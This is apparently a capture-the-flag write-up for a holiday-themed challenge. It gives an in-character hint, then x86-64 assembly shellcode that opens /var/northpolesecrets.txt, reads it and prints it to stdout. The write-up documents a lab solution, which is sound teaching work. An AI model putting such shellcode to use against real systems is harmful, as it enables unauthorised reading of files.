    <b> Hints from Ruby Cyster : </b> <br>
    I'm looking at this system, and it has me a little bit worried.<br>
    If I didn't know better, I'd say someone here is learning how to hack North Pole systems.<br>
    Who's got that kind of nerve!<br>
    Anyway, I hear some elf on the other roof knows a bit about this type of thing.<br>

    <b> Note:</b> <br>

    This objective has 11 steps. 1-10 are easy to follow tutorials which will be used for step 11. 
    Step 11 has no hints and solving that would answer this objective. <br>
    Therefore, in the interest of documentation for other objectives in the report we are doing to provide details on step 11 only.

<b>Shell Code for step 11. Reading a file (/var/northpolesecrets.txt)</b>
```shell
;sys_open
call doit
db '/var/northpolesecrets.txt',0
 
doit:
mov rax, 2
pop rdi
mov rsi, 0
mov rdx, 0
syscall
  
; TODO: Call sys_read on the file handle and read it into rsp
;sys_read
;push rdi ; Temporarily store the filename pointer
;push rax ; Temporarily store the handle
;pop rdi ; Move the file handle into rdi
;pop rsi ; 
mov rdi, rax ; sys_open returns the fd into rax, so move it to rdi before set rax to sys_read.
mov rax, 0 ; Syscall 0 = sys_read
mov rdx, 1000 ; rdx is the count
mov rsi,rsp; from the hint
syscall
 
; TODO: Call sys_write to write the contents from rsp to stdout (1)
mov rax, 1 ; Syscall 1 = sys_write
mov rdi, 1 ; File handle to write to = stdout = 1  ; (rsi is already the buffer)
mov rdx, 1000; rdx is the count again 
mov rsi, rsp; from the hint
syscall ; Perform the sys_write syscall, writing the data to stdout
 
; sys_exit
mov rax, 3Ch ; for sys_exit
mov rdi, 0 ; exit code
syscall
```
